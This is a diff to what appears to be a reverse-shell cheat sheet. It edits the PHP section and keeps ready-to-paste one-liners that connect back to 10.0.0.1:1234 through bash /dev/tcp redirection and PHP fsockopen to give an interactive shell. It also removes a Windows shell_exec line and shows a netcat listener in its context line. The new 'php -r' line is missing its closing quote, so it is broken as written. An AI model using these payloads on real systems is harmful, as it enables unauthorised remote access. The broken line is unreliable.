@@ -30,10 +30,8 @@ nc -u -lvp 4242
 
 ## PHP
 
-* `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'");?>`
-* `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
-* **For windows \(non reverse shell, just command execution\)**
-  * `<?php echo shell_exec("windows command");?>`
+* `<?php echo shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'");?>`
+* `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");`
 
 ## Javascript
 
